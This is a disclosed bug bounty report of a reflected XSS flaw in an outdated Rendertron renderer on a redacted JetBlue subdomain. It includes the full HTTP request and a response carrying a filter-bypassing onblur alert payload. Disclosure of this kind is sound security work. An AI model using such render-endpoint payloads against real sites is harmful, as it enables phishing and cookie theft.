# XSS via Vuln Rendertron Instance At `██████████.jetblue.com/render/*`

## Report Details
- **Report ID**: 1853061
- **URL**: https://hackerone.com/reports/1853061
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-31T05:25:51.702Z
- **Disclosed**: 2023-06-20T18:06:11.073Z

## Reporter
- **Username**: qualw1n
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: jetblue

## Vulnerability Information
## Summary

I found that you have █████████ installed on your server, but it may not be up to date. i was able to get around ███'s xss block and get it to raise an alert. this is a type of xss that is mirrored and as soon as you send a link to a person, the xss runs. and in a malicious scenario, it would be very compatible. why?

because it takes the code from the uploaded page and runs it as a response on the server.

Now you may say this is normal for a render page.
But unfortunately, it is not normal for an xss code to work, and it works in a subdomain with your domain.

## Affected URL

- https://█████████.jetblue.com/render
- https://██████████.jetblue.com/
- https://█████.jetblue.com/render/https://berkaybasar.github.io/  $Vulnerable Point

## Request

```
GET /render/https://berkaybasar.github.io/ HTTP/2
Host: ███.jetblue.com
Cookie: _ga=GA1.2.948863714.1675140227; _gid=GA1.2.104763714.1675140227
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://█████████.jetblue.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

## Response

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Renderer: ██████████
Strict-Transport-Security: max-age=15724800; includeSubDomains
Via: 1.1 varnish, 1.1 varnish
Accept-Ranges: bytes
Date: Tue, 31 Jan 2023 05:20:05 GMT
Age: 0
X-Served-By: cache-iad-kjyo7100133-IAD, cache-hhn-etou8220066-HHN
X-Cache: MISS, MISS
X-Cache-Hits: 0, 0
X-Timer: S1675142405.512544,VS0,VE1332
Vary: Accept-Encoding
Content-Length: 182

<html><head><base href="https://berkaybasar.github.io/"></head><body><xss onblur="alert(1)" id="x" tabindex="1" style="display:block">test</xss><input value="clickme">
</body></html>

```

## VIDEO

{F2145532}

## Impact

phishing redirect , stealing cookies etc.

## Attachments
No attachments
